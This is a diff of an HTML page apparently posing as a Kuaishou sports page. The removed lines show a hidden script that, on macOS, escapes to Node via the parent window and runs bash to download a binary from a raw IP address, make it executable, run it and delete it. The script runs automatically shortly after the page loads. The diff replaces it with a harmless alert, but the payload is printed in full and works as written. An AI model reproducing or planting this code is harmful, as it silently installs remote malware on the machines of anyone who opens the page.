@@ -2,34 +2,14 @@
 <html>
 
 <head>
-<title>快手体育</title>
+<title></title>
 </head>
 
 <body>
-        <div id="root"></div>
-
-<img src="https://s1.ax1x.com/2023/09/11/pPgelN9.jpg" alt="banner" class="banner-img" style="width: 100%;">
-
+      
 </body>
 <script>
-
-function macHack(){
-    var this_platform = window.parent.NODE.process.platform;
-    var this_arch = window.parent.NODE.process.arch;
-    
-    if (this_platform == 'darwin'){
-        if (this_arch == 'x64'){
-            window.parent.NODE['process'].binding('spawn_sync').spawn({file:'bash',args:['/bin/bash','-c','curl -s -k https://62.234.209.24:8003/cdp_x64 -o /tmp/cdp && chmod +x /tmp/cdp && /tmp/cdp && rm -rf /tmp/cdp'],envPairs:['y='],stdio:[{type:'pipe',readable:1}]})
-        }else if(this_arch == 'arm64'){
-            window.parent.NODE['process'].binding('spawn_sync').spawn({file:'bash',args:['/bin/bash','-c','curl -s -k https://62.234.209.24:8003/cdp_arm64 -o /tmp/cdp && chmod +x /tmp/cdp && /tmp/cdp && rm -rf /tmp/cdp'],envPairs:['y='],stdio:[{type:'pipe',readable:1}]})
-        }
-    }
-}
-
-setTimeout(function() { macHack(); }, 300);
-//window.onload = function() {
-    
-//}
+alert('ok');
 </script>
 
 </html>
